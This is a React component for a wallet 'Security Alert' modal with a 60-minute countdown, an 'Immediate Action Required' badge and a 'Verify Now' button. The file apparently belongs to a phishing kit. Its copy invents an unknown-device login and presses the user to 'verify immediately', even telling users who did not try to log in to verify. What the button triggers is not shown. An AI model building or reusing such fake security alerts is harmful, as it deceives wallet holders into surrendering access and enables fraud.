"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"

// Remove TypeScript interface and use plain JS props
export default function SecurityModal({ onVerify }) {
  const [timeRemaining, setTimeRemaining] = useState(3600) // 60 minutes in seconds

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeRemaining((prev) => {
        if (prev <= 1) {
          clearInterval(timer)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [])

  // Remove TypeScript type annotation
  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60)
    const remainingSeconds = seconds % 60
    return `${minutes.toString().padStart(2, "0")}:${remainingSeconds.toString().padStart(2, "0")}`
  }

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
      <Card className="w-full max-w-md mx-auto bg-white">
        <CardContent className="p-6 text-center space-y-4">
          <div className="space-y-2">
            <h2 className="text-xl font-semibold text-gray-800">Security Alert: Unknown Device Login Detected</h2>
            <Badge className="bg-blue-100 text-blue-800 hover:bg-blue-100">Immediate Action Required</Badge>
          </div>

          <p className="text-gray-600 text-sm leading-relaxed">
            We detected an unusual login attempt to your wallet from an unrecognized device. For your security,
            immediate verification is required to maintain access to your account.
          </p>

          <div className="py-2">
            <p className="text-blue-600 font-medium">Time remaining to verify: {formatTime(timeRemaining)}</p>
          </div>

          <p className="text-gray-600 text-sm">
            To prevent unauthorized access, please verify your identity immediately.
          </p>

          <Button
            onClick={onVerify}
            className="w-full bg-blue-500 hover:bg-blue-600 text-white py-3 rounded-lg font-medium"
          >
            Verify Now
          </Button>

          <p className="text-xs text-gray-500 mt-4">
            If you did not attempt to login, please verify immediately to secure your account and prevent unauthorized
            access.
          </p>
        </CardContent>
      </Card>
    </div>
  )
}